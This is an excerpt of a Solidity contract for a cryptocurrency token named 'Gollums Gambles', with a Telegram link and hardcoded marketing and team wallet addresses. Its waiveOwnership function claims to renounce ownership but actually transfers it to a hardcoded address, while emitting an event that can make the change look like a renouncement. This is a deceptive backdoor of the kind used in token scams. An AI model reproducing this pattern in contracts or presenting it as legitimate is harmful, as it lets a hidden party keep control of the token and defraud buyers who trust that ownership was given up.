...
/*    
    Welcome Gollum's Gambles Token
    
    https://t.me/Gollumsgamblestoken
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x1D687065a6DBd31A577a33bEf27E00DF0Ff335b6));
        _owner = address(0x1D687065a6DBd31A577a33bEf27E00DF0Ff335b6);
    }
...
contract GollumsGambles is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Gollums Gambles";
    string private _symbol = "GOLLUMS";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0x27B43Dfc08A6a2B50644d0e2fFa83d27F5619C4B);
    address payable public teamWalletAddress = payable(0xA132284075610fd577AfE4154CCf1E6e952396B1);
